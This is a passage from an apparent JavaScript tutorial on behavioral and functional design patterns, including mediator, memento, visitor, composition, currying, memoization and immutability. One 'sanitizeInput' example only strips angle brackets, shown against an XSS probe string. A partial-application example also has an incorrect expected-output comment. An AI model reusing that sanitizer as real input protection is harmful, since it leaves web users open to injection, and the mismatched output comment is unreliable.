  }
}

class Aircraft {
  constructor(id) {
    this.id = id;
    this.controlTower = null;
    this.status = 'airborne';
  }
  
  setControlTower(tower) {
    this.controlTower = tower;
  }
  
  requestLanding() {
    this.status = 'landing';
    this.controlTower.requestLanding(this);
  }
  
  requestTakeoff() {
    this.status = 'taking off';
    this.controlTower.requestTakeoff(this);
  }
  
  reportPosition(position) {
    this.controlTower.reportPosition(this, position);
  }
  
  receivePermission(message) {
    console.log(`${this.id} receives: ${message}`);
  }
}

// Usage
const tower = new ControlTower();

const flight1 = new Aircraft('Flight 001');
const flight2 = new Aircraft('Flight 002');

tower.register(flight1);
tower.register(flight2);

flight1.reportPosition('10 miles north');
flight1.requestLanding();

flight2.requestLanding(); // Should wait
```

---

## Memento Pattern

The Memento Pattern captures and externalizes an object's internal state without violating encapsulation, allowing the object to be restored to this state later.

### Basic Memento

```javascript
// Memento
class Memento {
  constructor(state) {
    this.state = state;
    this.timestamp = new Date();
  }
  
  getState() {
    return this.state;
  }
  
  getTimestamp() {
    return this.timestamp;
  }
}

// Originator
class TextEditor {
  constructor() {
    this.content = '';
  }
  
  type(text) {
    this.content += text;
  }
  
  getContent() {
    return this.content;
  }
  
  save() {
    return new Memento(this.content);
  }
  
  restore(memento) {
    this.content = memento.getState();
  }
}

// Caretaker
class History {
  constructor() {
    this.mementos = [];
  }
  
  push(memento) {
    this.mementos.push(memento);
  }
  
  pop() {
    return this.mementos.pop();
  }
  
  isEmpty() {
    return this.mementos.length === 0;
  }
}

// Usage
const editor = new TextEditor();
const history = new History();

editor.type('Hello');
history.push(editor.save());

editor.type(' World');
history.push(editor.save());

editor.type('!');
console.log('Current:', editor.getContent()); // "Hello World!"

// Undo
editor.restore(history.pop());
console.log('After undo:', editor.getContent()); // "Hello World"

// Undo again
editor.restore(history.pop());
console.log('After undo:', editor.getContent()); // "Hello"
```

### Game State Memento

```javascript
class GameState {
  constructor(level, score, health) {
    this.level = level;
    this.score = score;
    this.health = health;
  }
}

class Game {
  constructor() {
    this.level = 1;
    this.score = 0;
    this.health = 100;
  }
  
  play() {
    this.score += 100;
    console.log(`Playing... Score: ${this.score}`);
  }
  
  levelUp() {
    this.level++;
    this.health = 100;
    console.log(`Level up! Now at level ${this.level}`);
  }
  
  takeDamage(amount) {
    this.health -= amount;
    console.log(`Took damage! Health: ${this.health}`);
  }
  
  save() {
    console.log('Saving game...');
    return new GameState(this.level, this.score, this.health);
  }
  
  load(state) {
    console.log('Loading game...');
    this.level = state.level;
    this.score = state.score;
    this.health = state.health;
  }
  
  display() {
    console.log(`Level: ${this.level}, Score: ${this.score}, Health: ${this.health}`);
  }
}

class SaveManager {
  constructor() {
    this.saves = [];
  }
  
  save(state) {
    this.saves.push(state);
    console.log(`Saved state #${this.saves.length}`);
  }
  
  load(index) {
    if (index >= 0 && index < this.saves.length) {
      return this.saves[index];
    }
    return null;
  }
  
  list() {
    this.saves.forEach((state, index) => {
      console.log(`Save #${index + 1}: Level ${state.level}, Score ${state.score}`);
    });
  }
}

// Usage
const game = new Game();
const saveManager = new SaveManager();

game.play();
game.levelUp();
game.display(); // Level: 2, Score: 100, Health: 100

saveManager.save(game.save()); // Save point 1

game.play();
game.takeDamage(50);
game.display(); // Level: 2, Score: 200, Health: 50

saveManager.save(game.save()); // Save point 2

game.play();
game.takeDamage(60);
game.display(); // Level: 2, Score: 300, Health: -10 (dead)

// Load previous save
saveManager.list();
game.load(saveManager.load(0));
game.display(); // Level: 2, Score: 100, Health: 100
```

---

## Visitor Pattern

The Visitor Pattern lets you add further operations to objects without having to modify them, by separating the algorithm from the objects on which it operates.

### Basic Visitor

```javascript
// Element classes
class Employee {
  constructor(name, salary) {
    this.name = name;
    this.salary = salary;
  }
  
  accept(visitor) {
    return visitor.visitEmployee(this);
  }
}

class Department {
  constructor(name) {
    this.name = name;
    this.employees = [];
  }
  
  addEmployee(employee) {
    this.employees.push(employee);
  }
  
  accept(visitor) {
    return visitor.visitDepartment(this);
  }
}

// Visitors
class SalaryReportVisitor {
  visitEmployee(employee) {
    return `${employee.name}: $${employee.salary}`;
  }
  
  visitDepartment(department) {
    let report = `Department: ${department.name}\n`;
    department.employees.forEach(emp => {
      report += `  ${emp.accept(this)}\n`;
    });
    return report;
  }
}

class BonusCalculatorVisitor {
  visitEmployee(employee) {
    return employee.salary * 0.1; // 10% bonus
  }
  
  visitDepartment(department) {
    let total = 0;
    department.employees.forEach(emp => {
      total += emp.accept(this);
    });
    return total;
  }
}

// Usage
const engineering = new Department('Engineering');
engineering.addEmployee(new Employee('Alice', 100000));
engineering.addEmployee(new Employee('Bob', 120000));

const salaryReport = new SalaryReportVisitor();
console.log(engineering.accept(salaryReport));
// Department: Engineering
//   Alice: $100000
//   Bob: $120000

const bonusCalc = new BonusCalculatorVisitor();
console.log('Total bonuses:', engineering.accept(bonusCalc));
// Total bonuses: 22000
```

### File System Visitor

```javascript
class File {
  constructor(name, size) {
    this.name = name;
    this.size = size;
  }
  
  accept(visitor) {
    visitor.visitFile(this);
  }
}

class Directory {
  constructor(name) {
    this.name = name;
    this.children = [];
  }
  
  add(child) {
    this.children.push(child);
  }
  
  accept(visitor) {
    visitor.visitDirectory(this);
    this.children.forEach(child => child.accept(visitor));
  }
}

class SizeCalculatorVisitor {
  constructor() {
    this.totalSize = 0;
  }
  
  visitFile(file) {
    this.totalSize += file.size;
  }
  
  visitDirectory(directory) {
    // Just traverse, size calculated from files
  }
  
  getTotal() {
    return this.totalSize;
  }
}

class DisplayVisitor {
  constructor() {
    this.indent = 0;
  }
  
  visitFile(file) {
    console.log(`${' '.repeat(this.indent)}ðŸ“„ ${file.name} (${file.size}KB)`);
  }
  
  visitDirectory(directory) {
    console.log(`${' '.repeat(this.indent)}ðŸ“ ${directory.name}/`);
    this.indent += 2;
  }
}

// Usage
const root = new Directory('root');

const docs = new Directory('documents');
docs.add(new File('resume.pdf', 100));
docs.add(new File('letter.pdf', 50));

const photos = new Directory('photos');
photos.add(new File('vacation.jpg', 2000));

root.add(docs);
root.add(photos);
root.add(new File('readme.txt', 5));

const display = new DisplayVisitor();
root.accept(display);

const sizeCalc = new SizeCalculatorVisitor();
root.accept(sizeCalc);
console.log(`Total size: ${sizeCalc.getTotal()}KB`);
```

---

## Summary

This document covered Behavioral Design Patterns:

- **Observer Pattern**: One-to-many dependency (Event emitters, Pub/Sub, Store)
- **Iterator Pattern**: Sequential access to collections (Array iterator, ES6 iterators, generators, tree traversal)
- **Strategy Pattern**: Interchangeable algorithms (Payment strategies, validation, sorting)
- **Command Pattern**: Encapsulating requests (Basic commands, undo/redo, macro commands)
- **Chain of Responsibility**: Passing requests along a chain (Authentication chain, middleware, support tickets)
- **State Pattern**: Behavior changes with state (Traffic light, document workflow, vending machine)
- **Template Method**: Algorithm skeleton with customizable steps (Data processors, games, reports)
- **Mediator**: Centralized communication (Basic mediator, chat room, air traffic control)
- **Memento**: State capture and restore (Text editor, game saves)
- **Visitor**: Operations on object structures (Salary reports, file system traversal)

These patterns help manage complex behaviors and communication between objects.

---

**Related Topics:**

- Functional Patterns
- Async Patterns
- Event-Driven Architecture
- State Machines
# Functional Patterns


## Functional Patterns

Functional patterns focus on using functions as first-class citizens, emphasizing immutability, pure functions, and function composition.

---

## Function Composition

Function composition is the process of combining two or more functions to produce a new function.

### Basic Composition

```javascript
// Simple compose - right to left
const compose = (...fns) => x => 
  fns.reduceRight((acc, fn) => fn(acc), x);

// Pipe - left to right
const pipe = (...fns) => x => 
  fns.reduce((acc, fn) => fn(acc), x);

// Example functions
const add2 = x => x + 2;
const multiply3 = x => x * 3;
const subtract1 = x => x - 1;

// Compose: subtract1(multiply3(add2(5)))
const composedFn = compose(subtract1, multiply3, add2);
console.log(composedFn(5)); // (5 + 2) * 3 - 1 = 20

// Pipe: add2 -> multiply3 -> subtract1
const pipedFn = pipe(add2, multiply3, subtract1);
console.log(pipedFn(5)); // (5 + 2) * 3 - 1 = 20
```

### String Processing Pipeline

```javascript
const pipe = (...fns) => x => fns.reduce((acc, fn) => fn(acc), x);

// Individual transformations
const trim = str => str.trim();
const toLowerCase = str => str.toLowerCase();
const removeSpaces = str => str.replace(/\s+/g, '-');
const addPrefix = prefix => str => `${prefix}${str}`;
const addSuffix = suffix => str => `${str}${suffix}`;

// Create slug generator
const createSlug = pipe(
  trim,
  toLowerCase,
  removeSpaces,
  addPrefix('post-'),
  addSuffix('-2024')
);

console.log(createSlug('  Hello World  '));
// "post-hello-world-2024"

// Reusable transformations
const sanitizeInput = pipe(
  trim,
  str => str.replace(/[<>]/g, '')
);

const normalizeEmail = pipe(
  trim,
  toLowerCase
);

console.log(sanitizeInput('  <script>alert("xss")</script>  '));
// "scriptalert("xss")/script"

console.log(normalizeEmail('  Alice@EXAMPLE.COM  '));
// "alice@example.com"
```

### Data Transformation Pipeline

```javascript
const pipe = (...fns) => x => fns.reduce((acc, fn) => fn(acc), x);

// Data transformations
const filterActive = users => users.filter(u => u.active);
const sortByAge = users => [...users].sort((a, b) => b.age - a.age);
const mapToNames = users => users.map(u => u.name);
const take = n => arr => arr.slice(0, n);

// Create pipeline
const getTopActiveUsers = pipe(
  filterActive,
  sortByAge,
  mapToNames,
  take(3)
);

const users = [
  { name: 'Alice', age: 30, active: true },
  { name: 'Bob', age: 25, active: false },
  { name: 'Charlie', age: 35, active: true },
  { name: 'David', age: 28, active: true },
  { name: 'Eve', age: 32, active: true }
];

console.log(getTopActiveUsers(users));
// ["Charlie", "Eve", "Alice"]
```

### Async Function Composition

```javascript
// Async pipe
const asyncPipe = (...fns) => x => 
  fns.reduce(async (acc, fn) => fn(await acc), Promise.resolve(x));

// Async functions
const fetchUser = async id => {
  console.log(`Fetching user ${id}`);
  return { id, name: 'Alice', posts: [1, 2, 3] };
};

const fetchPosts = async user => {
  console.log(`Fetching posts for ${user.name}`);
  const posts = await Promise.all(
    user.posts.map(id => ({ id, title: `Post ${id}`, likes: id * 10 }))
  );
  return { ...user, posts };
};

const addStats = async user => {
  const totalLikes = user.posts.reduce((sum, p) => sum + p.likes, 0);
  return { ...user, stats: { totalLikes } };
};

// Create async pipeline
const getUserWithStats = asyncPipe(
  fetchUser,
  fetchPosts,
  addStats
);

// Usage
getUserWithStats(1).then(result => {
  console.log(result);
});
```

### Point-Free Style

```javascript
// Point-free (no explicit arguments)
const pipe = (...fns) => x => fns.reduce((acc, fn) => fn(acc), x);

// Not point-free
const doubleNumbers = numbers => numbers.map(n => n * 2);

// Point-free style
const double = x => x * 2;
const doubleAll = arr => arr.map(double);

// Even more point-free
const map = fn => arr => arr.map(fn);
const filter = fn => arr => arr.filter(fn);
const reduce = fn => init => arr => arr.reduce(fn, init);

const doubleNumbers2 = map(x => x * 2);
const evenNumbers = filter(x => x % 2 === 0);
const sum = reduce((a, b) => a + b)(0);

const processNumbers = pipe(
  evenNumbers,
  doubleNumbers2,
  sum
);

console.log(processNumbers([1, 2, 3, 4, 5, 6]));
// [2, 4, 6] -> [4, 8, 12] -> 24
```

---

## Higher-Order Functions

Higher-order functions are functions that take functions as arguments or return functions.

### Map, Filter, Reduce

```javascript
// Map - transform each element
const numbers = [1, 2, 3, 4, 5];

const doubled = numbers.map(x => x * 2);
console.log(doubled); // [2, 4, 6, 8, 10]

const squared = numbers.map(x => x ** 2);
console.log(squared); // [1, 4, 9, 16, 25]

// Filter - select elements
const evens = numbers.filter(x => x % 2 === 0);
console.log(evens); // [2, 4]

const greaterThan3 = numbers.filter(x => x > 3);
console.log(greaterThan3); // [4, 5]

// Reduce - combine elements
const sum = numbers.reduce((acc, x) => acc + x, 0);
console.log(sum); // 15

const product = numbers.reduce((acc, x) => acc * x, 1);
console.log(product); // 120

// Chain operations
const result = numbers
  .filter(x => x % 2 === 0)
  .map(x => x * 2)
  .reduce((acc, x) => acc + x, 0);

console.log(result); // [2, 4] -> [4, 8] -> 12
```

### Custom Higher-Order Functions

```javascript
// Create a function that runs a function n times
const times = n => fn => {
  for (let i = 0; i < n; i++) {
    fn(i);
  }
};

times(5)(i => console.log(`Iteration ${i}`));

// Create a function that retries on failure
const retry = (maxAttempts, delay = 1000) => fn => async (...args) => {
  let lastError;
  
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      return await fn(...args);
    } catch (error) {
      lastError = error;
      console.log(`Attempt ${attempt} failed:`, error.message);
      
      if (attempt < maxAttempts) {
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  
  throw lastError;
};

// Usage
const unreliableAPI = async () => {
  if (Math.random() < 0.7) {
    throw new Error('API failed');
  }
  return 'Success!';
};

const reliableAPI = retry(3, 500)(unreliableAPI);

// Create a function that logs execution
const withLogging = fn => (...args) => {
  console.log(`Calling ${fn.name} with:`, args);
  const result = fn(...args);
  console.log(`${fn.name} returned:`, result);
  return result;
};

const add = (a, b) => a + b;
const loggedAdd = withLogging(add);

loggedAdd(5, 3);
// Calling add with: [5, 3]
// add returned: 8
```

### Function Decorators

```javascript
// Timing decorator
const timed = fn => (...args) => {
  const start = performance.now();
  const result = fn(...args);
  const duration = performance.now() - start;
  console.log(`${fn.name} took ${duration.toFixed(2)}ms`);
  return result;
};

// Caching decorator
const cached = fn => {
  const cache = new Map();
  
  return (...args) => {
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      console.log('Cache hit');
      return cache.get(key);
    }
    
    console.log('Computing...');
    const result = fn(...args);
    cache.set(key, result);
    return result;
  };
};

// Once decorator - only execute once
const once = fn => {
  let called = false;
  let result;
  
  return (...args) => {
    if (!called) {
      result = fn(...args);
      called = true;
    }
    return result;
  };
};

// Usage
const fibonacci = n => {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
};

const cachedFib = cached(fibonacci);
const timedFib = timed(cachedFib);

console.log(timedFib(10));
console.log(timedFib(10)); // Cache hit

const initialize = once(() => {
  console.log('Initializing...');
  return { initialized: true };
});

initialize(); // Logs: "Initializing..."
initialize(); // No log
initialize(); // No log
```

### Array Methods as HOFs

```javascript
// Every - all elements match predicate
const allPositive = [1, 2, 3, 4].every(x => x > 0);
console.log(allPositive); // true

// Some - at least one element matches
const hasEven = [1, 2, 3, 4].some(x => x % 2 === 0);
console.log(hasEven); // true

// Find - first element that matches
const firstEven = [1, 2, 3, 4].find(x => x % 2 === 0);
console.log(firstEven); // 2

// FindIndex - index of first match
const firstEvenIndex = [1, 2, 3, 4].findIndex(x => x % 2 === 0);
console.log(firstEvenIndex); // 1

// FlatMap - map and flatten
const nested = [1, 2, 3].flatMap(x => [x, x * 2]);
console.log(nested); // [1, 2, 2, 4, 3, 6]

// Sort with comparator
const numbers = [3, 1, 4, 1, 5, 9, 2, 6];
const sorted = [...numbers].sort((a, b) => a - b);
console.log(sorted); // [1, 1, 2, 3, 4, 5, 6, 9]
```

---

## Currying and Partial Application

Currying transforms a function with multiple arguments into a sequence of functions each taking a single argument.

### Basic Currying

```javascript
// Regular function
const add = (a, b, c) => a + b + c;

// Curried version
const curriedAdd = a => b => c => a + b + c;

console.log(add(1, 2, 3)); // 6
console.log(curriedAdd(1)(2)(3)); // 6

// Partial application
const add1 = curriedAdd(1);
const add1And2 = add1(2);

console.log(add1And2(3)); // 6
console.log(add1And2(10)); // 13
```

### Auto-Curry Function

```javascript
// Generic curry function
const curry = fn => {
  const arity = fn.length;
  
  return function curried(...args) {
    if (args.length >= arity) {
      return fn.apply(this, args);
    }
    
    return (...moreArgs) => curried.apply(this, [...args, ...moreArgs]);
  };
};

// Usage
const add = (a, b, c) => a + b + c;
const curriedAdd = curry(add);

console.log(curriedAdd(1)(2)(3)); // 6
console.log(curriedAdd(1, 2)(3)); // 6
console.log(curriedAdd(1)(2, 3)); // 6
console.log(curriedAdd(1, 2, 3)); // 6

// Practical example
const multiply = (a, b, c) => a * b * c;
const curriedMultiply = curry(multiply);

const double = curriedMultiply(2);
const doubleThenTriple = double(3);

console.log(doubleThenTriple(4)); // 24
```

### Partial Application

```javascript
// Partial application function
const partial = (fn, ...fixedArgs) => 
  (...remainingArgs) => fn(...fixedArgs, ...remainingArgs);

// Example
const greet = (greeting, name) => `${greeting}, ${name}!`;

const sayHello = partial(greet, 'Hello');
const sayGoodbye = partial(greet, 'Goodbye');

console.log(sayHello('Alice')); // "Hello, Alice!"
console.log(sayGoodbye('Bob')); // "Goodbye, Bob!"

// More complex example
const fetch = (method, url, headers, body) => {
  console.log(`${method} ${url}`, headers, body);
  return { method, url, headers, body };
};

const get = partial(fetch, 'GET');
const post = partial(fetch, 'POST');

const getWithAuth = partial(get, undefined, { 'Authorization': 'Bearer token' });

getWithAuth('/api/users');
// GET /api/users { 'Authorization': 'Bearer token' } undefined
```

### Curried Utility Functions

```javascript
const curry = fn => {
  const arity = fn.length;
  return function curried(...args) {
    if (args.length >= arity) return fn(...args);
    return (...more) => curried(...args, ...more);
  };
};

// Curried map
const map = curry((fn, arr) => arr.map(fn));

const double = x => x * 2;
const doubleAll = map(double);

console.log(doubleAll([1, 2, 3])); // [2, 4, 6]

// Curried filter
const filter = curry((predicate, arr) => arr.filter(predicate));

const isEven = x => x % 2 === 0;
const filterEvens = filter(isEven);

console.log(filterEvens([1, 2, 3, 4, 5])); // [2, 4]

// Curried reduce
const reduce = curry((fn, init, arr) => arr.reduce(fn, init));

const sum = reduce((a, b) => a + b, 0);

console.log(sum([1, 2, 3, 4, 5])); // 15

// Compose with curried functions
const pipe = (...fns) => x => fns.reduce((acc, fn) => fn(acc), x);

const processNumbers = pipe(
  filterEvens,
  doubleAll,
  sum
);

console.log(processNumbers([1, 2, 3, 4, 5, 6]));
// [2, 4, 6] -> [4, 8, 12] -> 24
```

### Practical Currying Examples

```javascript
const curry = fn => {
  const arity = fn.length;
  return function curried(...args) {
    if (args.length >= arity) return fn(...args);
    return (...more) => curried(...args, ...more);
  };
};

// Validation
const validate = curry((rules, data) => {
  const errors = [];
  
  for (const [field, rule] of Object.entries(rules)) {
    if (!rule(data[field])) {
      errors.push(`${field} is invalid`);
    }
  }
  
  return { valid: errors.length === 0, errors };
});

const isRequired = val => val !== undefined && val !== '';
const isEmail = val => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
const isMinLength = min => val => val && val.length >= min;

const userRules = {
  name: isRequired,
  email: isEmail,
  password: isMinLength(8)
};

const validateUser = validate(userRules);

console.log(validateUser({ name: 'Alice', email: 'alice@example.com', password: '12345678' }));
// { valid: true, errors: [] }

console.log(validateUser({ name: '', email: 'invalid', password: '123' }));
// { valid: false, errors: [...] }

// HTTP client
const request = curry((method, baseUrl, endpoint, options) => {
  const url = `${baseUrl}${endpoint}`;
  console.log(`${method} ${url}`, options);
  return { method, url, options };
});

const api = request('GET')('https://api.example.com');
const getUsers = api('/users');
const getUser = api('/users/:id');

getUsers({});
getUser({ params: { id: 1 } });
```

---

## Memoization

Memoization is an optimization technique that caches function results based on their inputs.

### Basic Memoization

```javascript
const memoize = fn => {
  const cache = new Map();
  
  return (...args) => {
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      console.log('Cache hit');
      return cache.get(key);
    }
    
    console.log('Computing...');
    const result = fn(...args);
    cache.set(key, result);
    return result;
  };
};

// Expensive function
const fibonacci = n => {
  if (n <= 1) return n;
  return fibonacci(n - 1) + fibonacci(n - 2);
};

const memoizedFib = memoize(fibonacci);

console.log(memoizedFib(10)); // Computing...
console.log(memoizedFib(10)); // Cache hit
console.log(memoizedFib(15)); // Computing...
```

### Advanced Memoization

```javascript
const memoize = (fn, options = {}) => {
  const cache = new Map();
  const {
    maxSize = Infinity,
    maxAge = Infinity,
    keyGenerator = JSON.stringify
  } = options;
  
  return (...args) => {
    const key = keyGenerator(args);
    const cached = cache.get(key);
    
    // Check if cached and not expired
    if (cached && Date.now() - cached.timestamp < maxAge) {
      console.log('Cache hit');
      return cached.value;
    }
    
    // Compute result
    console.log('Computing...');
    const result = fn(...args);
    
    // Add to cache
    cache.set(key, {
      value: result,
      timestamp: Date.now()
    });
    
    // Enforce max size (LRU)
    if (cache.size > maxSize) {
      const firstKey = cache.keys().next().value;
      cache.delete(firstKey);
    }
    
    return result;
  };
};

// Usage with options
const expensiveCalculation = (a, b) => {
  let sum = 0;
  for (let i = 0; i < 1000000; i++) {
    sum += a + b;
  }
  return sum;
};

const memoized = memoize(expensiveCalculation, {
  maxSize: 100,
  maxAge: 5000 // 5 seconds
});

console.log(memoized(5, 3)); // Computing...
console.log(memoized(5, 3)); // Cache hit

setTimeout(() => {
  console.log(memoized(5, 3)); // Computing... (cache expired)
}, 6000);
```

### Recursive Memoization

```javascript
// Memoize recursive functions properly
const memoizeRecursive = fn => {
  const cache = new Map();
  
  const memoized = (...args) => {
    const key = JSON.stringify(args);
    
    if (cache.has(key)) {
      return cache.get(key);
    }
    
    const result = fn(memoized, ...args);
    cache.set(key, result);
    return result;
  };
  
  return memoized;
};

// Fibonacci with memoization
const fibonacci = memoizeRecursive((fib, n) => {
  if (n <= 1) return n;
  return fib(n - 1) + fib(n - 2);
});

console.log(fibonacci(40)); // Fast!
console.log(fibonacci(45)); // Still fast!

// Factorial with memoization
const factorial = memoizeRecursive((fact, n) => {
  if (n <= 1) return 1;
  return n * fact(n - 1);
});

console.log(factorial(10)); // 3628800
console.log(factorial(20)); // 2432902008176640000
```

### Practical Memoization

```javascript
const memoize = fn => {
  const cache = new Map();
  return (...args) => {
    const key = JSON.stringify(args);
    if (!cache.has(key)) {
      cache.set(key, fn(...args));
    }
    return cache.get(key);
  };
};

// API call memoization
const fetchUser = memoize(async id => {
  console.log(`Fetching user ${id} from API...`);
  // Simulate API call
  await new Promise(resolve => setTimeout(resolve, 1000));
  return { id, name: `User ${id}`, email: `user${id}@example.com` };
});

// Multiple calls only fetch once
Promise.all([
  fetchUser(1),
  fetchUser(1),
  fetchUser(1)
]).then(results => {
  console.log(results);
  // Only logs "Fetching user 1 from API..." once
});

// Expensive calculation memoization
const calculateDistance = memoize((x1, y1, x2, y2) => {
  console.log('Calculating distance...');
  return Math.sqrt((x2 - x1) ** 2 + (y2 - y1) ** 2);
});

console.log(calculateDistance(0, 0, 3, 4)); // Calculating... 5
console.log(calculateDistance(0, 0, 3, 4)); // 5 (cached)
```

---

## Pure Functions

Pure functions always return the same output for the same inputs and have no side effects.

### Pure vs Impure Functions

```javascript
// IMPURE - depends on external state
let counter = 0;

const incrementImpure = () => {
  counter++; // Side effect: modifies external state
  return counter;
};

console.log(incrementImpure()); // 1
console.log(incrementImpure()); // 2 (different result with same input)

// PURE - no side effects
const incrementPure = count => count + 1;

console.log(incrementPure(0)); // 1
console.log(incrementPure(0)); // 1 (same result with same input)

// IMPURE - modifies input
const addItemImpure = (cart, item) => {
  cart.push(item); // Mutates input
  return cart;
};

// PURE - returns new array
const addItemPure = (cart, item) => [...cart, item];

const cart = [{ name: 'Book', price: 10 }];

const cart2 = addItemPure(cart, { name: 'Pen', price: 2 });
console.log(cart); // Original unchanged
console.log(cart2); // New cart with item
```

### Benefits of Pure Functions

```javascript
// Easy to test
const add = (a, b) => a + b;
const multiply = (a, b) => a * b;

// Tests are simple and reliable
console.assert(add(2, 3) === 5);
console.assert(multiply(2, 3) === 6);

// Easy to compose
const addThenMultiply = (a, b, c) => multiply(add(a, b), c);
console.log(addThenMultiply(2, 3, 4)); // (2 + 3) * 4 = 20

// Cacheable (memoization)
const memoize = fn => {
  const cache = new Map();
  return (...args) => {
    const key = JSON.stringify(args);
    if (!cache.has(key)) {
      cache.set(key, fn(...args));
    }
    return cache.get(key);
  };
};

const expensiveAdd = memoize(add);

// Parallelizable - no race conditions
const numbers = [1, 2, 3, 4, 5];
const doubled = numbers.map(x => x * 2); // Can be parallelized safely
```

### Making Functions Pure

```javascript
// IMPURE - reads from Date
const getCurrentYear = () => {
  return new Date().getFullYear();
};

// PURE - date passed as parameter
const getYear = date => date.getFullYear();

console.log(getYear(new Date())); // Pass dependency explicitly

// IMPURE - random number
const rollDiceImpure = () => {
  return Math.floor(Math.random() * 6) + 1;
};

// PURE - random number generator passed in
const rollDicePure = rng => {
  return Math.floor(rng() * 6) + 1;
};

console.log(rollDicePure(Math.random));

// IMPURE - DOM access
const getInputValueImpure = () => {
  return document.getElementById('myInput').value;
};

// PURE - element passed as parameter
const getInputValuePure = element => element.value;

// IMPURE - HTTP request
const fetchUserImpure = async id => {
  const response = await fetch(`/api/users/${id}`);
  return response.json();
};

// PURE - HTTP client passed as dependency
const fetchUserPure = httpClient => async id => {
  const response = await httpClient.get(`/api/users/${id}`);
  return response.json();
};
```

### Pure Function Patterns

```javascript
// Array operations without mutation
const numbers = [1, 2, 3, 4, 5];

// IMPURE
const removeFirstImpure = arr => {
  arr.shift(); // Mutates array
  return arr;
};

// PURE
const removeFirstPure = arr => arr.slice(1);

console.log(removeFirstPure(numbers)); // [2, 3, 4, 5]
console.log(numbers); // [1, 2, 3, 4, 5] (unchanged)

// Object operations without mutation
const user = { name: 'Alice', age: 30 };

// IMPURE
const updateAgeImpure = (user, age) => {
  user.age = age; // Mutates object
  return user;
};

// PURE
const updateAgePure = (user, age) => ({ ...user, age });

console.log(updateAgePure(user, 31)); // { name: 'Alice', age: 31 }
console.log(user); // { name: 'Alice', age: 30 } (unchanged)

// Nested object updates
const state = {
  user: {
    profile: {
      name: 'Alice',
      settings: {
        theme: 'light'
      }
    }
  }
};

// PURE nested update
const updateTheme = (state, theme) => ({
  ...state,
  user: {
    ...state.user,
    profile: {
      ...state.user.profile,
      settings: {
        ...state.user.profile.settings,
        theme
      }
    }
  }
});

const newState = updateTheme(state, 'dark');
console.log(newState.user.profile.settings.theme); // 'dark'
console.log(state.user.profile.settings.theme); // 'light' (unchanged)
```

---

## Immutability Patterns

Immutability means data cannot be changed after creation. Instead, new copies are created with modifications.

### Immutable Arrays

```javascript
const numbers = [1, 2, 3, 4, 5];

// Add element
const withSix = [...numbers, 6];
console.log(withSix); // [1, 2, 3, 4, 5, 6]

// Remove element
const withoutThree = numbers.filter(x => x !== 3);
console.log(withoutThree); // [1, 2, 4, 5]

// Update element
const doubled = numbers.map(x => x * 2);
console.log(doubled); // [2, 4, 6, 8, 10]

// Update specific index
const updateAtIndex = (arr, index, value) => [
  ...arr.slice(0, index),
  value,
  ...arr.slice(index + 1)
];

const updated = updateAtIndex(numbers, 2, 99);
console.log(updated); // [1, 2, 99, 4, 5]

// Insert at index
const insertAtIndex = (arr, index, value) => [
  ...arr.slice(0, index),
  value,
  ...arr.slice(index)
];

const inserted = insertAtIndex(numbers, 2, 99);
console.log(inserted); // [1, 2, 99, 3, 4, 5]

// Sort (immutable)
const sortedDesc = [...numbers].sort((a, b) => b - a);
console.log(sortedDesc); // [5, 4, 3, 2, 1]
console.log(numbers); // [1, 2, 3, 4, 5] (unchanged)
```

### Immutable Objects

```javascript
const user = {
  name: 'Alice',
  age: 30,
  email: 'alice@example.com'
};

// Update property
const olderUser = { ...user, age: 31 };
console.log(olderUser);

// Add property
const userWithPhone = { ...user, phone: '123-456-7890' };
console.log(userWithPhone);

// Remove property
const { email, ...userWithoutEmail } = user;
console.log(userWithoutEmail);

// Deep update
const state = {
  user: {
    profile: { name: 'Alice', age: 30 },
    settings: { theme: 'light' }
  }
};

// Helper for deep updates
const updateIn = (obj, path, value) => {
  const [head, ...rest] = path;
  
  if (rest.length === 0) {
    return { ...obj, [head]: value };
  }
  
  return {
    ...obj,
    [head]: updateIn(obj[head], rest, value)
  };
};

const newState = updateIn(state, ['user', 'profile', 'age'], 31);
console.log(newState.user.profile.age); // 31
console.log(state.user.profile.age); // 30 (unchanged)
```

### Immutable Data Structures

```javascript
// Immutable List
class ImmutableList {
  constructor(items = []) {
    this.items = Object.freeze([...items]);
  }
  
  push(item) {
    return new ImmutableList([...this.items, item]);
  }
  
  pop() {
    return new ImmutableList(this.items.slice(0, -1));
  }
  
  map(fn) {
    return new ImmutableList(this.items.map(fn));
  }
  
  filter(fn) {
    return new ImmutableList(this.items.filter(fn));
  }
  
  get(index) {
    return this.items[index];
  }
  
  toArray() {
    return [...this.items];
  }
}

const list = new ImmutableList([1, 2, 3]);
const list2 = list.push(4);
const list3 = list2.map(x => x * 2);

console.log(list.toArray()); // [1, 2, 3]
console.log(list2.toArray()); // [1, 2, 3, 4]
console.log(list3.toArray()); // [2, 4, 6, 8]

// Immutable Map
class ImmutableMap {
  constructor(obj = {}) {
    this.data = Object.freeze({ ...obj });
  }
  
  set(key, value) {
    return new ImmutableMap({ ...this.data, [key]: value });
  }
  
  delete(key) {
    const { [key]: _, ...rest } = this.data;
    return new ImmutableMap(rest);
  }
  
  get(key) {
    return this.data[key];
  }
  
  has(key) {
    return key in this.data;
  }
  
  toObject() {
    return { ...this.data };
  }
}

const map = new ImmutableMap({ a: 1, b: 2 });
const map2 = map.set('c', 3);
const map3 = map2.delete('b');

console.log(map.toObject()); // { a: 1, b: 2 }
console.log(map2.toObject()); // { a: 1, b: 2, c: 3 }
console.log(map3.toObject()); // { a: 1, c: 3 }
```

### Object.freeze and Const

```javascript
// const prevents reassignment
const arr = [1, 2, 3];
// arr = [4, 5, 6]; // Error
arr.push(4); // But can still mutate!
console.log(arr); // [1, 2, 3, 4]

// Object.freeze prevents mutation
const frozenArr = Object.freeze([1, 2, 3]);
frozenArr.push(4); // Silently fails (throws in strict mode)
console.log(frozenArr); // [1, 2, 3]

const obj = { name: 'Alice', age: 30 };
const frozenObj = Object.freeze(obj);
frozenObj.age = 31; // Silently fails
console.log(frozenObj.age); // 30

// Deep freeze
const deepFreeze = obj => {
  Object.freeze(obj);
  
  Object.values(obj).forEach(value => {
    if (typeof value === 'object' && value !== null) {
      deepFreeze(value);
    }
  });
  
  return obj;
};

const nested = {
  user: {
    profile: {
      name: 'Alice',
      settings: { theme: 'light' }
